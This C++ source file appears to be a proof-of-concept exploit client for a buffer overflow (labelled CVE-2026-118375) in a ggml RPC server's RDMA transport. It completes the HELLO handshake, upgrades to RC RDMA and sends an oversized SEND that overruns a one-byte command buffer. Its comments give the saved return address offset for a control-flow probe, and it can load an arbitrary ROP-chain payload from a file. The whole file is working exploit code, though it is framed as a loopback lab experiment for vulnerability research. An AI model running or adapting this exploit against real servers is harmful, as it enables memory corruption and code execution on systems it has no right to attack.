// Raw libibverbs client for CVE-2026-118375 live-server experiment.
// Loopback only. Performs the RPC HELLO/caps exchange over TCP, upgrades to
// RC RDMA using the server's advertised QPN/PSN/GID, then sends one SEND of
// `len` bytes where the server expects a 1-byte RPC command.
//
// Build: g++ -std=c++17 -O0 -g rdma_attacker.cpp -libverbs -o rdma_attacker
// Use:   ./rdma_attacker 127.0.0.1 53052 [len]
#include <arpa/inet.h>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <array>
#include <cerrno>
#include <vector>

#include <infiniband/verbs.h>

namespace {

constexpr size_t kCapsSize = 24;
constexpr size_t kChunk = 256 * 1024;
constexpr int kRxSlots = 4;
constexpr uint8_t kHelloCmd = 14;

struct caps {
    uint32_t qpn;
    uint32_t psn;
    uint8_t gid[16];
};
static_assert(sizeof(caps) == kCapsSize, "caps layout");

void die(const char * what) {
    fprintf(stderr, "FAIL: %s (errno=%d %s)\n", what, errno, strerror(errno));
    exit(2);
}

bool send_all(int fd, const void * data, size_t len) {
    const uint8_t * p = static_cast<const uint8_t *>(data);
    while (len) {
        ssize_t n = ::send(fd, p, len, 0);
        if (n <= 0) return false;
        p += n;
        len -= static_cast<size_t>(n);
    }
    return true;
}

bool recv_all(int fd, void * data, size_t len) {
    uint8_t * p = static_cast<uint8_t *>(data);
    while (len) {
        ssize_t n = ::recv(fd, p, len, 0);
        if (n <= 0) return false;
        p += n;
        len -= static_cast<size_t>(n);
    }
    return true;
}

int find_gid(struct ibv_context * ctx, struct ibv_port_attr & pa,
             std::array<uint8_t, 16> & gid_out, int & type_out) {
    // RoCE shape of IPv4 loopback: ::ffff:127.0.0.1
    std::array<uint8_t, 16> target{};
    target[10] = 0xff;
    target[11] = 0xff;
    target[12] = 127;
    target[15] = 1;

    int best = -1, best_type = -1;
    for (uint32_t i = 0; i < pa.gid_tbl_len; ++i) {
        struct ibv_gid_entry e = {};
        int rc = ibv_query_gid_ex(ctx, 1, i, &e, 0);
        if (rc != 0) {
            fprintf(stderr, "gid[%u] query_ex rc=%d errno=%d; legacy query\n",
                    i, rc, errno);
            union ibv_gid legacy = {};
            if (ibv_query_gid(ctx, 1, i, &legacy) != 0) continue;
            std::memcpy(e.gid.raw, &legacy, sizeof(legacy));
            e.gid_type = IBV_GID_TYPE_IB;
        }
        if (i < 4 || std::memcmp(e.gid.raw, target.data(), 16) == 0) {
            fprintf(stderr, "gid[%u] type=%u raw=", i, e.gid_type);
            for (auto b : e.gid.raw) fprintf(stderr, "%02x", b);
            fprintf(stderr, "\n");
        }
        if (std::memcmp(e.gid.raw, target.data(), 16) != 0) continue;
        if (e.gid_type == IBV_GID_TYPE_ROCE_V2) {
            best = static_cast<int>(i);
            best_type = static_cast<int>(e.gid_type);
            break;
        }
        if (best < 0) {
            best = static_cast<int>(i);
            best_type = static_cast<int>(e.gid_type);
        }
    }
    if (best >= 0) {
        std::memcpy(gid_out.data(), target.data(), 16);
        type_out = best_type;
        return best;
    }
    fprintf(stderr, "no GID matched ::ffff:127.0.0.1 on port 1\n");
    return -1;
}

struct qp_setup {
    struct ibv_context * ctx = nullptr;
    struct ibv_pd * pd = nullptr;
    struct ibv_comp_channel * ch = nullptr;
    struct ibv_cq * scq = nullptr;
    struct ibv_cq * rcq = nullptr;
    struct ibv_qp * qp = nullptr;
    uint8_t * tx = nullptr;
    uint8_t * rx = nullptr;
    struct ibv_mr * tx_mr = nullptr;
    struct ibv_mr * rx_mr = nullptr;
    uint32_t max_inline = 0;
    std::array<uint8_t, 16> gid{};
    struct ibv_port_attr pa = {};
};

bool post_rx(qp_setup & s, int slot) {
    struct ibv_sge sg = {};
    sg.addr = reinterpret_cast<uintptr_t>(s.rx + static_cast<size_t>(slot) * kChunk);
    sg.length = kChunk;
    sg.lkey = s.rx_mr->lkey;
    struct ibv_recv_wr wr = {}, * bad = nullptr;
    wr.wr_id = static_cast<uint64_t>(slot);
    wr.sg_list = &sg;
    wr.num_sge = 1;
    return ibv_post_recv(s.qp, &wr, &bad) == 0;
}

bool qp_to_rtr(qp_setup & s, uint32_t remote_qpn, uint32_t remote_psn,
               const uint8_t * remote_gid, int sgid_index) {
    struct ibv_qp_attr a = {};
    a.qp_state = IBV_QPS_RTR;
    a.path_mtu = s.pa.active_mtu;
    a.dest_qp_num = remote_qpn;
    a.rq_psn = remote_psn;
    a.max_dest_rd_atomic = 1;
    a.min_rnr_timer = 1;
    a.ah_attr.is_global = 1;
    std::memcpy(&a.ah_attr.grh.dgid, remote_gid, 16);
    a.ah_attr.grh.hop_limit = 1;
    a.ah_attr.grh.sgid_index = sgid_index;
    a.ah_attr.dlid = 0;
    a.ah_attr.port_num = 1;
    return ibv_modify_qp(s.qp, &a,
            IBV_QP_STATE | IBV_QP_AV | IBV_QP_PATH_MTU | IBV_QP_DEST_QPN |
            IBV_QP_RQ_PSN | IBV_QP_MAX_DEST_RD_ATOMIC | IBV_QP_MIN_RNR_TIMER) == 0;
}

}  // namespace

int main(int argc, char ** argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s host port [byte_len]\n", argv[0]);
        return 2;
    }
    const char * host = argv[1];
    int port = atoi(argv[2]);
    size_t len = argc > 3 ? static_cast<size_t>(atoi(argv[3])) : 43;
    if (len == 0 || len > kChunk) die("invalid length");

    const char * dev_name = std::getenv("GGML_RDMA_DEV");
    if (!dev_name) dev_name = "rxe0";
    int ndev = 0;
    ibv_device ** devs = ibv_get_device_list(&ndev);
    if (!devs || ndev == 0) die("no verbs device");
    qp_setup s;
    for (int i = 0; i < ndev; ++i) {
        if (std::strcmp(ibv_get_device_name(devs[i]), dev_name) == 0) {
            s.ctx = ibv_open_device(devs[i]);
            break;
        }
    }
    ibv_free_device_list(devs);
    if (!s.ctx) die("open device");
    if (ibv_query_port(s.ctx, 1, &s.pa) != 0) die("query port");
    int gid_type = -1;
    int gid_index = find_gid(s.ctx, s.pa, s.gid, gid_type);
    if (gid_index < 0) die("find GID");
    fprintf(stderr, "device=%s port=1 gid_index=%d gid_type=%d mtu=%d\n",
            dev_name, gid_index, gid_type, s.pa.active_mtu);

    s.pd = ibv_alloc_pd(s.ctx);
    s.ch = ibv_create_comp_channel(s.ctx);
    s.scq = ibv_create_cq(s.ctx, 16, nullptr, s.ch, 0);
    s.rcq = ibv_create_cq(s.ctx, kRxSlots + 4, nullptr, s.ch, 0);
    if (!s.pd || !s.ch || !s.scq || !s.rcq) die("alloc pd/cq/channel");

    struct ibv_qp_init_attr qia = {};
    qia.send_cq = s.scq;
    qia.recv_cq = s.rcq;
    qia.qp_type = IBV_QPT_RC;
    qia.cap.max_send_wr = 4;
    qia.cap.max_recv_wr = kRxSlots + 4;
    qia.cap.max_send_sge = 1;
    qia.cap.max_recv_sge = 1;
    qia.cap.max_inline_data = 256;
    s.qp = ibv_create_qp(s.pd, &qia);
    if (!s.qp) die("create qp");
    s.max_inline = qia.cap.max_inline_data;

    s.tx = static_cast<uint8_t *>(aligned_alloc(4096, kChunk));
    s.rx = static_cast<uint8_t *>(aligned_alloc(4096, static_cast<size_t>(kRxSlots) * kChunk));
    if (!s.tx || !s.rx) die("aligned_alloc");
    s.tx_mr = ibv_reg_mr(s.pd, s.tx, kChunk, IBV_ACCESS_LOCAL_WRITE);
    s.rx_mr = ibv_reg_mr(s.pd, s.rx, static_cast<size_t>(kRxSlots) * kChunk, IBV_ACCESS_LOCAL_WRITE);
    if (!s.tx_mr || !s.rx_mr) die("reg_mr");

    // QP RESET -> INIT
    struct ibv_qp_attr init = {};
    init.qp_state = IBV_QPS_INIT;
    init.port_num = 1;
    init.pkey_index = 0;
    init.qp_access_flags = IBV_ACCESS_REMOTE_WRITE | IBV_ACCESS_REMOTE_READ | IBV_ACCESS_LOCAL_WRITE;
    if (ibv_modify_qp(s.qp, &init,
            IBV_QP_STATE | IBV_QP_PKEY_INDEX | IBV_QP_PORT | IBV_QP_ACCESS_FLAGS) != 0) {
        die("qp INIT");
    }
    for (int i = 0; i < kRxSlots; ++i) {
        if (!post_rx(s, i)) die("post rx");
    }

    int fd = ::socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) die("socket");
    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(static_cast<uint16_t>(port));
    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) die("inet_pton");
    if (::connect(fd, reinterpret_cast<struct sockaddr *>(&addr), sizeof(addr)) != 0) die("connect");

    caps local = {};
    local.qpn = s.qp->qp_num;
    local.psn = s.qp->qp_num & 0xffffff;
    std::memcpy(local.gid, s.gid.data(), 16);
    uint64_t req_size = kCapsSize;
    if (!send_all(fd, &kHelloCmd, 1) || !send_all(fd, &req_size, sizeof(req_size)) ||
        !send_all(fd, &local, sizeof(local))) {
        die("send HELLO");
    }
    fprintf(stderr, "sent HELLO: qpn=%u psn=%u\n", local.qpn, local.psn);

    uint64_t rsp_size = 0;
    if (!recv_all(fd, &rsp_size, sizeof(rsp_size))) die("recv rsp size");
    if (rsp_size != 28) {
        fprintf(stderr, "FAIL: unexpected HELLO response size %llu\n",
                static_cast<unsigned long long>(rsp_size));
        return 3;
    }
    uint8_t rsp[28] = {};
    if (!recv_all(fd, rsp, sizeof(rsp))) die("recv HELLO rsp");
    caps remote = {};
    std::memcpy(&remote, rsp + 4, sizeof(remote));
    fprintf(stderr, "HELLO rsp v%u.%u.%u caps qpn=%u psn=%u gid=",
            rsp[0], rsp[1], rsp[2], remote.qpn, remote.psn);
    for (auto b : remote.gid) fprintf(stderr, "%02x", b);
    fprintf(stderr, "\n");

    if (!qp_to_rtr(s, remote.qpn, remote.psn, remote.gid, gid_index)) die("qp RTR");
    struct ibv_qp_attr rts = {};
    rts.qp_state = IBV_QPS_RTS;
    rts.timeout = 14;
    rts.retry_cnt = 7;
    rts.rnr_retry = 7;
    rts.sq_psn = local.psn;
    rts.max_rd_atomic = 1;
    if (ibv_modify_qp(s.qp, &rts,
            IBV_QP_STATE | IBV_QP_TIMEOUT | IBV_QP_RETRY_CNT | IBV_QP_RNR_RETRY |
            IBV_QP_SQ_PSN | IBV_QP_MAX_QP_RD_ATOMIC) != 0) {
        die("qp RTS");
    }
    fprintf(stderr, "QP RTS, posting %zu-byte SEND\n", len);

    // Optional raw payload (lab ROP chain). Default behaviour is unchanged.
    const char * payload_file = std::getenv("RDMA_PAYLOAD_FILE");
    if (payload_file) {
        FILE * fp = std::fopen(payload_file, "rb");
        if (!fp) die("open payload file");
        std::vector<uint8_t> bytes;
        uint8_t buf[65536];
        size_t n = 0;
        while ((n = std::fread(buf, 1, sizeof(buf), fp)) > 0) {
            bytes.insert(bytes.end(), buf, buf + n);
        }
        std::fclose(fp);
        if (bytes.empty() || bytes.size() > kChunk) die("invalid payload file");
        len = bytes.size();
        std::memcpy(s.tx, bytes.data(), len);
        fprintf(stderr, "loaded %zu bytes from %s\n", len, payload_file);
    } else {
        // First byte is a valid RPC command (DEVICE_COUNT) so a non-overflowing
        // server would answer normally; markers check byte placement later.
        for (size_t i = 0; i < len; ++i) s.tx[i] = 0x41;
        s.tx[0] = 15;
        if (len > 11) s.tx[11] = 0x5a;
        if (len > 18) s.tx[18] = 0x44;
        // Measured in the non-ASan Debug build: rpc_serve_client saved RIP is at
        // &cmd + 3585. Mark eight bytes there for the control-flow reach probe.
        if (len >= 3593) {
            for (size_t i = 3585; i < 3593; ++i) s.tx[i] = 0x42;
        }
    }

    bool use_inline = len <= s.max_inline;
    struct ibv_sge sg = {};
    sg.addr = reinterpret_cast<uintptr_t>(s.tx);
    sg.length = static_cast<uint32_t>(len);
    sg.lkey = s.tx_mr->lkey;
    struct ibv_send_wr wr = {}, * bad = nullptr;
    wr.opcode = IBV_WR_SEND;
    wr.sg_list = &sg;
    wr.num_sge = 1;
    wr.send_flags = IBV_SEND_SIGNALED | (use_inline ? IBV_SEND_INLINE : 0);
    if (ibv_post_send(s.qp, &wr, &bad) != 0) die("post send");

    struct ibv_wc wc = {};
    int polled = 0;
    for (int i = 0; i < 1000000; ++i) {
        polled = ibv_poll_cq(s.scq, 1, &wc);
        if (polled > 0) break;
        if (polled < 0) die("poll cq");
        usleep(1000);
    }
    if (polled <= 0) die("no send completion");
    fprintf(stderr, "send wc status=%d opcode=%d byte_len=%u wr_id=%llu inline=%d\n",
            wc.status, wc.opcode, wc.byte_len,
            static_cast<unsigned long long>(wc.wr_id), use_inline ? 1 : 0);
    if (wc.status != IBV_WC_SUCCESS) return 4;

    // Keep TCP alive briefly so the server's poll loop does not see a peer
    // close before it consumes the completion, then close cleanly.
    usleep(1500000);
    ::close(fd);
    return 0;
}
